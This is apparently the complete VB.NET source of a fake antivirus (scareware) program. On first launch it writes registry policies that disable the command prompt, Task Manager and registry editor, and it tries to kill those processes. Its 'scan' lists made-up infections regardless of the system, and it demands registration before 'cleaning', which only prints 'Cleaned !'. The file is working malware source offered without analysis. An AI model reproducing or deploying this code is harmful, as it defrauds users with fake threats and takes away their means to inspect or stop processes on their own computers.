
Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Start()
        My.Settings.isScanComplete = "No"
        FlatListBox1.Clear()
        Label8.Hide()
        Label16.Hide()
        Label11.Text = "OS Version : " + My.Computer.Info.OSFullName
        Label12.Text = "Computer name and current user : " + My.User.Name
        If My.Settings.isActivated = "Yes" Then
            Label4.Hide()
            FlatButton6.Hide()
        Else
            Label9.Hide()
        End If
        If My.Settings.isFirstRun = "Yes" Then
            My.Settings.isFirstRun = "No"
            Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System\ /v DisableCMD /t REG_DWORD /d 1")
            Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1")
            Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1")
            Shell("taskkill /im /f cmd.exe")
            Shell("taskkill /im /f regedit.exe")
            Shell("taskkill /im /f taskmgr.exe")
        End If
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        FlatProgressBar1.Increment(1)
        If FlatProgressBar1.Value = FlatProgressBar1.Maximum Then
            If My.Settings.isAllThreadsCleaned = "No" Then
                FlatListBox1.AddItem("Win32.Trojan.Backd0or")
                FlatListBox1.AddItem("Win32.Adware.Enderman")
                FlatListBox1.AddItem("Win32.Spyware.K8nL")
                FlatListBox1.AddItem("Win32.Worm.MyDoom.A")
                FlatListBox1.AddItem("Win32.RootKit.R0otKit")
                FlatListBox1.AddItem("Win32.Keylogger.Logger.A")
                FlatListBox1.AddItem("Win32.Spyware.LOm7")
                FlatProgressBar1.Value = 0
                My.Settings.isScanComplete = "Yes"
                Timer1.Stop()
            Else
                FlatProgressBar1.Value = 0
                Timer1.Stop()
                FlatListBox1.AddItem("Nothing found !")
            End If
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        FlatProgressBar2.Increment(1)
        If FlatProgressBar2.Value = FlatProgressBar2.Maximum Then
            Timer2.Stop()
            Label8.Show()
            FlatProgressBar2.Value = "0"
        End If
    End Sub
    Private Sub FlatButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton1.Click
        If My.Settings.isActivated = "Yes" Then
            Label16.Hide()
            Timer3.Start()
        Else
            register_form.Show()
        End If
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        FlatProgressBar3.Increment(1)
        If FlatProgressBar3.Value = FlatProgressBar3.Maximum Then
            Timer3.Stop()
            Label16.Show()
            FlatProgressBar3.Value = "0"
        End If
    End Sub

    Private Sub FlatButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton2.Click
        If My.Settings.isScanComplete = "Yes" And My.Settings.isActivated = "No" Then
            register_form.Show()
        ElseIf My.Settings.isScanComplete = "Yes" Then
            FlatListBox1.Clear()
            FlatListBox1.AddItem("Cleaned !")
            My.Settings.isAllThreadsCleaned = "Yes"
        End If
    End Sub

    Private Sub FlatButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton3.Click
        Me.Close()
    End Sub

    Private Sub FlatButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton4.Click
        Timer1.Start()
        My.Settings.isScanComplete = "No"
        FlatListBox1.Clear()
    End Sub

    Private Sub FlatButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton5.Click
        Timer2.Start()
        Label8.Hide()
    End Sub

    Private Sub FlatButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton6.Click
        register_form.Show()
    End Sub
End Class
